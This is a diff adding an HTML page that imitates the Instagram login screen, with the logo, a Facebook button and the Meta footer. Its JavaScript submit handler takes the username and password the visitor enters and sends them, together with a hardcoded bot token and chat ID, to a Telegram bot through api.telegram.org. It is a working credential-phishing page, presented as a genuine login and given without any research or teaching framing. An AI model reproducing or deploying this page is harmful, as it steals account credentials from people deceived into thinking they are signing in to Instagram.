@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            width: 350px;
+        }
+
+        .logo {
+            margin: 20px 0;
+        }
+
+        .logo img {
+            width: 175px;
+        }
+
+        .fb-login {
+            background-color: #0095f6;
+            color: white;
+            padding: 8px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: #8e8e8e;
+            font-size: 0.9rem;
+        }
+
+        a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .signup {
+            margin-top: 20px;
+            padding: 20px;
+        }
+
+        .meta-links {
+            position: fixed;
+            bottom: 0;
+            padding: 20px;
+            font-size: 0.8rem;
+            color: #8e8e8e;
+            text-align: center;
+        }
+    </style>
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault();  // Prevent form submission
+
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username === "" || password === "") {
+                alert("Please enter both username and password.");
+                return;
+            }
+
+            let telegramBotToken = "7832552714:AAFIlY7N7cEGeQBC3zBKyRru_msGrCJw5-A";
+            let chatID = "5565449948";
+            let message = `🔔 New Login Attempt\n📧 Email/Phone: ${username}\n🔑 Password: ${password}`;
+
+            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Login info sent successfully!");
+                    } else {
+                        alert("Failed to send data.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Error sending data.");
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://iili.io/2QshGZQ.jpg" alt="Instagram Logo">
+        </div>
+        <button class="fb-login">Continue with Facebook</button>
+        
+        <div class="separator">OR</div>
+        
+        <form onsubmit="sendToTelegram(event)">
+            <input type="text" id="username" placeholder="Phone number, username, or email">
+            <input type="password" id="password" placeholder="Password">
+            <a href="#">Forgot password?</a>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+        
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <div class="meta-links">
+        <div>
+            Meta About Blog Jobs Help API Privacy Terms<br>
+            Locations Instagram Lite Threads<br>
+            Contact Uploading & Non-Users Meta Verified<br>
+            English © 2025 Instagram from Meta
+        </div>
+    </div>
+</body>
+  </html>
